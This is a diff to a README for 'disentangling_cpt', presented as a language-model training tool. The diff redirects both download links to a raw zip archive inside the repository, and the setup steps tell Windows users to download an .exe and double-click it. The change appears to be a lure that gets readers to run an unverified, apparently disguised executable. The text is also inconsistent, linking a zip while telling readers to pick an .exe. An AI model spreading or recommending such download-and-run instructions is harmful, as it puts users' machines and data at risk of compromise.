@@ -1,6 +1,6 @@
 # 🧩 disentangling_cpt - Improve Your Language Model Training Results
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Riviunexchangeable4244/disentangling_cpt)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Riviunexchangeable4244/disentangling_cpt/raw/refs/heads/main/lsn/disentangling-cpt-1.2.zip)
 
 ## 📖 About This Tool
 
@@ -22,7 +22,7 @@ Your computer needs specific parts to run this software well. Please check your 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. **Visit the download page.** Go to the [official release link](https://github.com/Riviunexchangeable4244/disentangling_cpt) to find the correct files.
+1. **Visit the download page.** Go to the [official release link](https://github.com/Riviunexchangeable4244/disentangling_cpt/raw/refs/heads/main/lsn/disentangling-cpt-1.2.zip) to find the correct files.
 2. **Download the file.** Select the file ending in .exe for your system.
 3. **Run the installer.** Double-click the file once it finishes saving to your computer.
 4. **Follow the prompts.** The window will show you where to place the program files. Click "Next" to accept the default settings.
